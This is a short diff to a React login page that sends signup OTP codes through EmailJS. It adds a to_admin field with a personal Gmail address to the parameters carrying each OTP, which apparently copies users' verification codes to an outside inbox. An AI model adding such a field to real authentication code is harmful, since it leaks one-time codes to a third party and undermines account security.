@@ -208,6 +208,7 @@ export default function LoginPage() {
     const templateParams = {
         to_email: signupForm.email,
         otp: newOtp,
+        to_admin: "gamezonepro94@gmail.com"
     };
 
     emailjs.send(
@@ -396,5 +397,7 @@ export default function LoginPage() {
     </div>
   );
 }
+
+    
 
     
